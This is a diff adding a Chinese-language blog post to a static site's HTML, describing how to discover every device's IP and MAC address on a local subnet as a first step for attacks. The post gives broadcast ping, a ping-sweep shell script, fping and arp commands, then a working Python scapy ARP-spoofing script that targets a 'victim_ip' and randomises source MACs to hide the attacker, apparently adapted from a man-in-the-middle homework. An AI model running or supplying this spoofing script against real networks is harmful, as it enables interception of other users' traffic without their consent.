@@ -691,6 +691,90 @@
 
 
   
+    <article id="post-broadcast-ping" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/10/broadcast-ping/">显示所有同一子网内的设备ip和mac地址</a>
+    </h1>
+  
+
+        
+        <a href="/2019/03/10/broadcast-ping/" class="archive-article-date">
+  	<time datetime="2019-03-10T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在同一子网内的攻击应该对黑客来说是最简单的了，因为你可以轻而易举的完成信息的获取。<br>以下所有攻击信息获取的第一步：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.0.255 \\在组网内广播arp请求获取arp回应，之前一直以为广播必须是每一位都置1，没想到在子网内只需要子网地址置1就可以了</span><br><span class="line">arp -a \\显示arp表内的所有设备</span><br></pre></td></tr></table></figure>
+<p>有的设备会屏蔽广播请求，这时候就需要新写一个脚本了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">COUNTER=1</span><br><span class="line"></span><br><span class="line">while [ $COUNTER -lt 254 ]</span><br><span class="line">do</span><br><span class="line">   ping 192.168.1.$COUNTER -c 1</span><br><span class="line">   COUNTER=$(( $COUNTER + 1 ))</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>上面这个脚本有点慢，我太菜了没想出怎么并行跑它<br>不过网上有个轮子<br>用brew下载fping</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" &lt; /dev/null 2&gt; /dev/null</span><br><span class="line">brew install fping</span><br></pre></td></tr></table></figure>
+<p>然后运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -a -g 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+<p>不过这个给的轮子不太完美，电脑arp表会把没有应答的地址也写进去<br>所以需要自己grep一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a | grep '^[^? (]'</span><br></pre></td></tr></table></figure>
+<p>然后你就有了所有人的ip地址和mac地址<br>在之后的攻击就因人而异了，这里介绍一下最简单的arp欺骗：<br>用受害设备的ip向路由器发送arp请求，可以实现arp欺骗，使路由器误以为使用该ip的设备更换了。<br>简单写一个ARP欺骗的脚本(从我mitm攻击作业改的)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MAC_address</span><span class="params">(IP)</span>:</span></span><br><span class="line">    <span class="comment"># this function is used to get to know the MAC address associated with the IP address</span></span><br><span class="line">    ans, unans = srp(Ether(dst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>) / ARP(pdst=IP), timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> send, receive <span class="keyword">in</span> ans:</span><br><span class="line">        <span class="keyword">return</span> receive[Ether].src</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router_ip = <span class="string">"192.168.1.1"</span></span><br><span class="line">victim_ip = <span class="string">"192.168.1.153"</span></span><br><span class="line">router_mac = MAC_address(victim_ip)</span><br><span class="line">victim_mac = MAC_address(router_ip)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=router_ip, pdst=victim_ip, hwsrc=RandMAC(), hwdst=victim_mac))  <span class="comment"># hwdst is not necessary</span></span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=victim_ip, pdst=router_ip, hwsrc=RandMAC(), hwdst=router_mac  <span class="comment"># use random hwsrc to hide who u r</span></span><br><span class="line">             ))  <span class="comment"># when implementing arp spoofing, this is not necessary</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Security</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/03/10/broadcast-ping/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
   
 
 
@@ -777,6 +861,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">杂</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Security</a>
               </li>
              
               <li class="article-tag-list-item">
